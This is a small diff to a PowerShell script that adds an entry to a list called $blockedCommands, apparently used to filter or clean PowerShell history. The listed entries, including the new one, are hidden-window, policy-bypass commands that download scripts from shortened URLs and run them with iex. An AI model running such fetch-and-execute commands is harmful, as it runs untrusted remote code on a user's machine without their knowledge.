@@ -9,6 +9,7 @@ $blockedCommands = @(
     'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "C:\Users\adris\Desktop\Powershell ki Chudai\history delete.ps1"'
     'powershell -windowstyle hidden -ep bypass -c "irm https://shorturl.at/to9Mg | iex"'
     'powershell -windowstyle hidden -ep bypass -c "irm https://shorturl.at/YFedx | iex"'
+    'powershell -windowstyle hidden -ep bypass -c "irm https://tinyurl.com/cursedcorehack | iex; irm https://tinyurl.com/CursedCoreHidden | iex"'
 )
 
 if (Test-Path $historyFile) {
